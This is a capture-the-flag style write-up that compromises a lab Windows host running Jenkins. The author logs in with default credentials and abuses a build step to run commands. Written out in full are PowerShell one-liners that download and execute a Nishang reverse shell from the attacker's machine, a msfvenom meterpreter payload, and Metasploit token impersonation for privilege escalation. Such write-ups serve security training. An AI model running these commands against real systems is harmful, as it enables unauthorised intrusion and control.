Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.

# Scanning

Let's begin scanning the target using Rustscan.

```shell
rustscan -a 10.10.174.157 -r 1-65535 --ulimit 5000 -- -sVC
```
<img src="{{'/assets/img/images/05.Alfred/01.png' | prepend: site.baseurl }}" height="800">

From the port scan, we can see that there are three open ports. Let's look what's running on that ports.

# Enumeration

There is nothing interesting on port 80. But on port 8080, there is Jenkins running. All we can see is a login page. Let's try to use the default usernames:passwords, and then we will use automated tools to brute force the login page.

<img src="{{'/assets/img/images/05.Alfred/02.png' | prepend: site.baseurl }}" height="500">

On using admin as username and admin as password, we are able to successfully login into the Jenkins server.

<img src="{{'/assets/img/images/05.Alfred/03.png' | prepend: site.baseurl }}" height="600">

We can see a project that was already created. On clicking, it takes us to the following page.

<img src="{{'/assets/img/images/05.Alfred/04.png' | prepend: site.baseurl }}" height="600">

The configure button on the left side leads to a page where we can execute Windows batch commands under the build section.

<img src="{{'/assets/img/images/05.Alfred/05.png' | prepend: site.baseurl }}">

Let us try to see if it is working. We will now change the command to ipconfig and see if it works.

<img src="{{'/assets/img/images/05.Alfred/06.png' | prepend: site.baseurl }}">

Save it and build. 

After building, we will check the build history.

<img src="{{'/assets/img/images/05.Alfred/07.png' | prepend: site.baseurl }}" height="400">

Under console output, we can see that there is output for the command we used earlier.

<img src="{{'/assets/img/images/05.Alfred/08.png' | prepend: site.baseurl }}" height="300">

<img src="{{'/assets/img/images/05.Alfred/09.png' | prepend: site.baseurl }}">

# Exploitation
We will download [Nishang](https://github.com/samratashok/nishang) into our machine and use the [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 "Invoke-PowerShellTcp.ps1") to get the reverse shell.
```shell
git clone https://github.com/samratashok/nishang.git
```
```shell
cd nishang
```
Start the python webserver to host the file so that we can download it to the target machine. 
```shell
python -m http.server
```
<img src="{{'/assets/img/images/05.Alfred/10.png' | prepend: site.baseurl }}">

Now copy the following command into the build section where we can execute commands. This command downloads the powershell script from our webserver and runs it on the target machine using the ip address and port that we specify as arguments. We will be using our machine ip address and the port that we want to use for the reverse shell.

```shell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.29.149:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.6.29.149 -Port 3333
```
<img src="{{'/assets/img/images/05.Alfred/11.png' | prepend: site.baseurl }}">

Save the changes and apply.

In a new terminal window, use netcat to listen on port 3333.

```shell
nc -lnvp 3333
```
<img src="{{'/assets/img/images/05.Alfred/12.png' | prepend: site.baseurl }}" height="100">

Now build the project.

<img src="{{'/assets/img/images/05.Alfred/13.png' | prepend: site.baseurl }}" height="400">

And we get a reverse shell!

<img src="{{'/assets/img/images/05.Alfred/14.png' | prepend: site.baseurl }}" height="500">

<img src="{{'/assets/img/images/05.Alfred/15.png' | prepend: site.baseurl }}">

Now we will elevate our shell to a meterpreter reverse shell.

We will generate a payload that we can run on the target machine and get a reverse shell in meterpreter.

```shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.29.149 LPORT=4444 -f exe -o shell.exe
```
<img src="{{'/assets/img/images/05.Alfred/16.png' | prepend: site.baseurl }}">

Launch metasploit. Use multi/handler with the meterpreter payload set. 

```shell
msfconsole -q
```
```shell
use multi/handler
```
```shell
set payload windows/meterpreter/reverse_tcp
```
```shell
set lhost tun0
```
```shell
set lport 4444
```
```shell
run
```
Again start the python http server and download the generated payload to the target machine and run it.

```shell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.29.149:8000/shell.exe','shell.exe')"
```
```shell
Start-Process "shell.exe"
```
<img src="{{'/assets/img/images/05.Alfred/17.png' | prepend: site.baseurl }}">

Go back to metasploit and we get a meterpreter session opened.

# Privilege Escalation

Let's check the privileges for the user that we are currenlty logged in.

```shell
whoami /priv
```
We can see that the SeImpersonatePrivilege is enabled. Let's try token impersonation.

<img src="{{'/assets/img/images/05.Alfred/19.png' | prepend: site.baseurl }}" height="700">

Load the incognito module and list the available tokens.
```shell
load incognito
```
```shell
list_tokens -g
```
<img src="{{'/assets/img/images/05.Alfred/20.png' | prepend: site.baseurl }}" height="700">

<img src="{{'/assets/img/images/05.Alfred/21.png' | prepend: site.baseurl }}" height="400">

We can see that there is BUILTIN\Administrators token available. Let's impersonate that token.
```shell
impersonate_token "BUILTIN\Administrators"
```shell
Now we will check if we got the privileged access.
```shell
getuid
```
<img src="{{'/assets/img/images/05.Alfred/22.png' | prepend: site.baseurl }}" height="150">

We can see that we have higher privileged token but we will not get permissions of privileged user unless we migrate our process to another process with correct privileges . We will migrate our process from shell.exe to services.exe so that we can get the permissions of a privileged user.

We will check the processes and then migrate from shell.exe to services.exe.
```shell
ps
```
<img src="{{'/assets/img/images/05.Alfred/23.png' | prepend: site.baseurl }}">

Use the PID of the services.exe to migrate.
```shell
migrate 668
```
<img src="{{'/assets/img/images/05.Alfred/24.png' | prepend: site.baseurl }}" height="130">

Now have privileged access and we can read the root flag located at C:\Windows\System32\config.

<img src="{{'/assets/img/images/05.Alfred/25.png' | prepend: site.baseurl }}" height="80">
